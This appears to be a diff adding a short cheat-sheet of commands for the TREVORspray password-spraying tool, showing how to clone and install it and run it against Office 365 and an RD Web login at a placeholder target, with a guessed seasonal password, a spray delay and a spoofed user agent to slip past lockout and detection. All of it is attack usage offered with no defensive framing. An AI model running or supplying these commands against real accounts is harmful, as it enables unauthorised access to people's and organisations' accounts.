@@ -1,0 +1,14 @@
+# ================= TREVORspray =================
+# Clone and setup
+git clone https://github.com/blacklanternsecurity/TREVORspray.git
+cd TREVORspray
+pip3 install -r requirements.txt
+
+# Run against O365
+python3 TREVORspray.py -U users.txt -P pass.txt --o365
+
+# Run against RD Web
+python3 TREVORspray.py -U users.txt -P Summer2024 --rdweb https://rdweb.target.com
+
+# Set spray delay and user-agent
+python3 TREVORspray.py -U users.txt -P passwords.txt --o365 --delay 5 --user-agent "Mozilla/5.0"
